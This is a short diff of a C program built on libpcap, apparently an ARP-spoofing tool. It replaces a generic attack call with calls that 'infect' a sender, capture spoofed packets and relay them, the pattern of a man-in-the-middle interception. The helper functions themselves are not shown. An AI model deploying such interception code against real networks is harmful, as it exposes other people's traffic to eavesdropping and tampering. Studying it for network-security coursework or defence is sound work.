@@ -30,8 +30,11 @@ int main(int argc, char* argv[]) {
 
         // spoof
         target.ip = Ip(argv[i+1]);
-        attack(handle);
-        printf("Attack Success\n");
+        infect_sender(handle);
+        printf("Sender infected\n");
+
+        u_char* packet = get_spoofed_packet(handle);
+        relay(handle, packet);
     }
     pcap_close(handle);
     return 0;
